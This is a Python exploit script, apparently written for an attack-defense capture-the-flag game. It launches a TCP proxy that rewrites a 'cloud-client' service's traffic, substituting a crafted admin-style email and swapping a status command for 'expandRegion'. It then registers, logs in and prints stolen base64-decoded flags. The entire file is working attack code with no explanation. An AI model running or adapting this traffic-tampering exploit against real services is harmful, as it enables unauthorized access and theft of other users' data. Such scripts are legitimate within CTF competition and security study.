#!/usr/bin/python
import string
from sys import argv
from time import sleep
from pwn import process
from os import kill, remove
from base64 import b64decode
from subprocess import Popen
from random import randrange, SystemRandom

UNIQPORTS = []

def gen_rand_str(length):
    return ''.join(SystemRandom()
                   .choice(string.ascii_letters + string.digits)
             for _ in range(length))

def create_proxy(ip, rport, replaces):
    lport = randrange(10000, 65535)
    while lport in UNIQPORTS: lport = randrange(10000, 65535)
    UNIQPORTS.append(lport)
    repname = gen_rand_str(5)+".rep"
    writer = open(repname, "w")
    for key in replaces:
        writer.write(str(len(key)).ljust(8,chr(0))+":"+str(len(replaces[key])).ljust(8,chr(0))+"\n")
        writer.write(key+":"+replaces[key]+"\n")
    prox = Popen(['tcpproxy/tcpproxy.py', '-om', 'replace:file={}'.format(repname), '-ti', ip, '-tp', str(rport), '-li', 'localhost', '-lp', str(lport)], close_fds=True)
    sleep(0.5)
    return prox.pid, lport, repname

def register(ip, lport, email, username, password):
    io = process("./cloud-client -ip={ip} -port={port} -register -rapid-connect".format(ip=ip, port=lport), shell=True)
    io.sendlineafter(b"Email: ", email)
    io.sendlineafter(b"Username: ", username)
    io.sendlineafter(b"Password: ", password)
    io.recv()
    return

def getflags(ip, lport, email, password):
    flags = []
    io = process("./cloud-client -ip={ip} -port={port} -login -rapid-connect".format(ip=ip, port=lport), shell=True)
    io.sendlineafter(b"Email: ", email)
    io.sendlineafter(b"Password: ", password)
    io.sendlineafter(b"Choice >> \x1b[0m", b"4")
    io.sendlineafter(b"VM name: ", "xQ1WIoRaT5D6HwP1rrIIrIlvNvUkjKP37oNz4aFGodI=")
    region = io.recvuntil(">> \x1b[0m")
    flagcount = region.count(b"Tag")
    io.unrecv(region)
    for _ in range(flagcount):
        io.recvuntil(b"Tag: ")
        flags.append(b64decode(io.recvuntil(b" ").rstrip()))
    return flags

def exploit(ip, port):
    email = "admin@blackstab.com" + gen_rand_str(5)
    username = gen_rand_str(10)
    password = gen_rand_str(13)
    dummymail = "exp@black.com"
    pid, lport, repname = create_proxy(ip, port, {repr(dummymail): str(list(email)), repr("statusofmyVM"): repr("expandRegion")})
    register("localhost", lport, dummymail, username, password)
    print('\n'.join(list(map(lambda x: x.decode(), getflags("localhost", lport, dummymail, password)))))
    kill(pid, 9)
    remove(repname)
    
exploit(argv[1], argv[2])